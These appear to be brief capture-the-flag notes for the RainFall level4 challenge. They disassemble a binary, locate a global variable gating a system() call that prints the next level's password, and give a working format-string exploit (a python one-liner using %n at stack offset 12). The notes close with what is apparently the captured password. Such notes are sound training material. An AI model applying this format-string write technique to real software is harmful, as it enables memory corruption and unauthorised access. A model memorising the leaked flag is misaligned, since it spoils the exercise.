```
mov    0x8049810,%eax
cmp    $0x1025544,%eax

x 0x8049810
0x8049810 <m>:	0x00000000

objdump -t ./level4 | grep bss
08049810 g     O .bss	00000004              m

```
cmp var m with `p 0x1025544 = 16930116`

fuzz the binary

```
level4@RainFall:~$ python -c 'print "AAAA" + " %p " * 30' | ./level4
AAAA 0xb7ff26b0  0xbffff754  0xb7fd0ff4  (nil)  (nil)  0xbffff718  0x804848d  0xbffff510  0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141
```

```
level4@RainFall:~$ python -c 'print "AAAA" + " %12$x" ' | ./level4
AAAA 41414141
```

p 0x1025544 - 4 = 16930112

```
 0x08048499 <+66>:	movl   $0x8048590,(%esp)
 0x080484a0 <+73>:	call   0x8048360 <system@plt>
 
(gdb) x/s 0x8048590
0x8048590:	 "/bin/cat /home/user/level5/.pass"
```

```
python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"' | ./level4 
python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d%12$n" ' | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
